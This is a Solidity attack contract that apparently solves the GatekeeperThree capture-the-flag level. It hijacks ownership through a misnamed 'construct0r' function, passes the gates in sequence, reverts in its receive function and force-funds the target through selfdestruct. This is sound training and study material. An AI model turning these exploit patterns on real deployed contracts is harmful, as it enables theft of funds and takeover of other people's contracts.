// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/GatekeeperThree.sol";

contract GatekeeperThreeAttack{
    function att(address payable addr) public {
        GatekeeperThree(addr).construct0r();
        GatekeeperThree(addr).createTrick();
        GatekeeperThree(addr).getAllowance(1);
        GatekeeperThree(addr).enter();
    }
    receive() external payable {
        revert();
     }
}
contract getb{
    constructor(address payable addr) payable {
        b(addr);
    }
    function b(address payable addr) public  {
        selfdestruct(addr);
    }
}
